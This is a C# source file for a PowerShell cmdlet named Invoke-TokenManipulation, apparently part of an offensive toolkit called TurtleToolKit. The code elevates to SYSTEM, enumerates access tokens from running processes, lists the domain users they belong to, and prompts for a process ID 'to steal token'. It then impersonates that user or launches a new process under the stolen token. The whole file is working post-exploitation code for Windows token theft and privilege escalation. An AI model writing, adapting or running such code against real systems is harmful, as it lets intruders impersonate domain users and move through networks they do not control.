using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using TurtleToolKitManaged;
using TurtleToolKitImpersonate;
using TurtleToolKitOutputs;
using System.Management.Automation;
using System.Runtime.InteropServices;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "TokenManipulation")] // <- seeting cmdlet name and verbs
    [Alias("INVTKNM")] //<- cmdlet alias
    public class InvokeTokenManipulation : Cmdlet
    {
        [Parameter(Mandatory = true)] [Alias("ui")] public bool noUi { get; set; }
        [Parameter(Mandatory = false)] [Alias("e")] public string exe { get; set; }


        public static List<TokenObjects> tokensList;
        public static string exePath;


        protected override void BeginProcessing(){
            base.BeginProcessing();
            tokensList = new List<TokenObjects>();
            exePath = exe;
        }
        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            EnumTokens();
            Console.WriteLine("### Total Usable Tokens Found {0} ###",tokensList.Count);
            Console.WriteLine("### Users List ###");
            PrintUsers();
            Console.Write("Enter a username to impersonate: ");
            string usr = Console.ReadLine();
            if (!ImpersonateUser(usr,noUi))
            {
                WriteWarning("Failed to impersonate "+usr);
                FreeAllTokens();
                return;
            }
            FreeAllTokens();
            WriteWarning("Success");
            return;
        }
        protected override void EndProcessing() { base.EndProcessing(); }
        protected override void StopProcessing() { base.StopProcessing(); }

        public static void FreeAllTokens()
        {
            foreach (TokenObjects tObj in tokensList)
            {
                Win32.CloseHandle(tObj.tokenHandle);
            }
         }
        public static void PrintUsers()
        {
            List<string> usernames = new List<string>();
            foreach (TokenObjects t in tokensList)
            {
                if (!usernames.Contains(t.userName))
                {
                    usernames.Add(t.userName);
                    Console.WriteLine("{0}\\{1}",t.userDomain,t.userName);
                }
            }
        }
        public static bool GetTokenInformation(ref TokenObjects t)
        {
            IntPtr hToken = t.tokenHandle;
            uint TokenStatusLength = 0;
            bool Result;
            // first call gets lenght of TokenInformation
            Result = Win32.GetTokenInformation(hToken, Win32.TOKEN_INFORMATION_CLASS.TokenStatistics, IntPtr.Zero, TokenStatusLength, out TokenStatusLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((int)TokenStatusLength);
            Result = Win32.GetTokenInformation(hToken, Win32.TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenStatusLength, out TokenStatusLength);
            if (!Result)
            {
                Console.WriteLine("Error getting token stats");
                return false;
            }
            // get logon session data
            Win32.TOKEN_STATISTICS TokenStats = (Win32.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Win32.TOKEN_STATISTICS));
            IntPtr LuidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Win32.TOKEN_STATISTICS)));
            Marshal.StructureToPtr(TokenStats.AuthenticationId, LuidPtr, false);
            IntPtr LogonSessionDataPTr = IntPtr.Zero;
            uint res = Win32.LsaGetLogonSessionData(LuidPtr, out LogonSessionDataPTr);
            if (res != 0 && LogonSessionDataPTr == IntPtr.Zero)
            {
                Console.WriteLine("error getting lsa logon session data");
                return false;
            }
            Win32.SECURITY_LOGON_SESSION_DATA LogonSessonData = (Win32.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(LogonSessionDataPTr, typeof(Win32.SECURITY_LOGON_SESSION_DATA));
            if (LogonSessonData.Username.Buffer != IntPtr.Zero && LogonSessonData.LoginDomain.Buffer != IntPtr.Zero)
            {
                string UserName = Marshal.PtrToStringUni(LogonSessonData.Username.Buffer, LogonSessonData.Username.Length/2);
                string UserDomain = Marshal.PtrToStringUni(LogonSessonData.LoginDomain.Buffer, LogonSessonData.LoginDomain.Length / 2);
                //Console.WriteLine(UserName);
                // disregard computer account all we care about is domain users really
                // at this point more stuff can be enumerated with GetTokenInformation
                // like if token is impersonation token or not
                // or if token is elevated etc
                // dont really care about that for now
                if (UserName == Environment.MachineName.ToString() + "$")
                {
                    Console.WriteLine("Skipping computer account");
                    return false;
                }
                // create return object?
                //Console.WriteLine("{0}\\{1} LogonType:{2}", UserDomain, UserName, LogonSessonData.LogonType);
                t.userName = UserName;
                t.userDomain = UserDomain;
                t.logonType = LogonSessonData.LogonType;
                return true;
            }
            return false;
        }
        public static bool ImpersonateUser(string userName,bool noUi)
        {
            if (Impersonator.ElevateToSystem() != 0)
            {
                Console.WriteLine("Failed to get system before impersonating user");
                return false;
            }
            foreach (TokenObjects tObj in tokensList)
            {
                if (tObj.userName == userName)
                {
                    Console.WriteLine("{0}\\{1} -> {2}::{3}", tObj.userDomain, tObj.userName, tObj.procName,tObj.pid);
                    continue;
                } else
                {
                    continue;
                } 
            }
            Console.WriteLine("Pick a pid to steal token");
            int targetPid = Convert.ToInt32(Console.ReadLine());
            if (noUi)
            {
                if (!Impersonator.ImpersonateLoggedOnUserViaToken(targetPid))
                {
                    Console.WriteLine("err failed impersonate logged on user VIA TOKEN {0}", Marshal.GetLastWin32Error());
                    Impersonator.RevokePrivs();
                    return false;
                }
                return true;
            }
            // Create New Process
            if (!Impersonator.CreateProcessFromToken(targetPid, exePath))
            {
                Console.WriteLine("err failed impersonate logged on user VIA TOKEN {0}", Marshal.GetLastWin32Error());
                Impersonator.RevokePrivs();
                return false;
            }
            return true;
            
        }
        public static bool EnumTokens()
        {
            if (Impersonator.ElevateToSystem() != 0)
            {
                Console.WriteLine("Failed to impersonate system token...needed for token enumertation");
                return false;
            }
            // continue with token enum
            Process[] procs = Process.GetProcesses();
            IntPtr hToken;
            IntPtr hProcess;
            foreach (Process p in procs)
            {
                if (p.ProcessName != "csrss" && p.Id != 0 && p.ProcessName != "system" && p.ProcessName != "System") 
                {
                    //Console.WriteLine("{0} -> {1}", p.Id, p.ProcessName);
                    // get primary token
                    hProcess = Win32.OpenProcess((uint)Win32.ProcessAccessFlags.All, true, p.Id);
                    if (hProcess == IntPtr.Zero)
                    {
                        Win32.CloseHandle(hProcess);
                        Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                        continue;
                    }

                    if (!Win32.OpenProcessToken(hProcess, Win32.TOKEN_ALL_ACCESS, out hToken))
                    {
                        Win32.CloseHandle(hProcess);
                        Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                        continue;
                    }
                    if (hToken == IntPtr.Zero)
                    {
                        Win32.CloseHandle(hProcess);
                        Console.WriteLine("Failed to get handle to token");
                        continue;
                    }
                    //Get-TokenInformation
                    TokenObjects t = new TokenObjects();
                    t.processHandle = hProcess;
                    t.tokenHandle = hToken;
                    t.pid = p.Id;
                    t.procName = p.ProcessName;
                    bool res = GetTokenInformation(ref t);
                    if (!res)
                    {
                        Win32.CloseHandle(hProcess);
                        Console.WriteLine("Failed to fill token object");
                        continue;
                    }
                    // if token filled add to list
                    Win32.CloseHandle(hProcess);
                    tokensList.Add(t);
                    // dont close token handle cause we need it to impersonate user
                    //Win32.CloseHandle(hToken);
                }
            }
            Impersonator.RevokePrivs();
            return true;
        }
    }
}